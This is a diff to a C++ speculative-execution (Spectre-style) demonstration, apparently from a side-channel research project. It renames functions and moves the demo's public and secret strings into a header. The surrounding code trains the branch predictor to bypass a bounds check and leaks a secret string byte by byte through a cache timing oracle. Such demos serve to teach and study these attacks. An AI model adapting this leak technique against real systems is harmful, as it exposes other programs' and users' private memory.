@@ -22,14 +22,9 @@
 
 #include "cache_sidechannel.h"
 #include "instr.h"
+#include "local_content.h"
+#include "utils.h"
 
-// Objective: given some control over accesses to the *non-secret* string
-// "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" without
-// ever accessing it in the C++ execution model, using speculative execution and
-// side channel attacks
-//
-const char *public_data = "Hello, world!";
-const char *private_data = "It's a s3kr3t!!!";
 constexpr size_t kArrayLength = 64;
 
 // Leaks the byte that is physically located at &text[0] + offset, without ever
@@ -40,9 +35,9 @@ constexpr size_t kArrayLength = 64;
 // Instead, the leak is performed by accessing out-of-bounds during speculative
 // execution, bypassing the bounds check by training the branch predictor to
 // think that the value will be in-range.
-static char leak_byte(const char *data, size_t offset) {
+static char LeakByte(const char *data, size_t offset) {
   CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
+  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
   std::unique_ptr<std::array<size_t *, kArrayLength>> array_of_pointers =
       std::unique_ptr<std::array<size_t *, kArrayLength>>(
           new std::array<size_t *, kArrayLength>);
@@ -91,7 +86,7 @@ static char leak_byte(const char *data, size_t offset) {
       // Speculative fetch at the local_offset. Architecturally it fetches
       // always at the safe_offset, though speculatively it prefetches the
       // unsafe offset when i is at the local_pointer_index.
-      ForceRead(isolated_oracle.data() + static_cast<size_t>(
+      ForceRead(oracle.data() + static_cast<size_t>(
           data[local_offset]));
     }
 
@@ -116,7 +111,7 @@ int main() {
     // On at least some machines, this will print the i'th byte from
     // private_data, despite the only actually-executed memory accesses being
     // to valid bytes in public_data.
-    std::cout << leak_byte(public_data, private_offset + i);
+    std::cout << LeakByte(public_data, private_offset + i);
     std::cout.flush();
   }
   std::cout << "\nDone!\n";
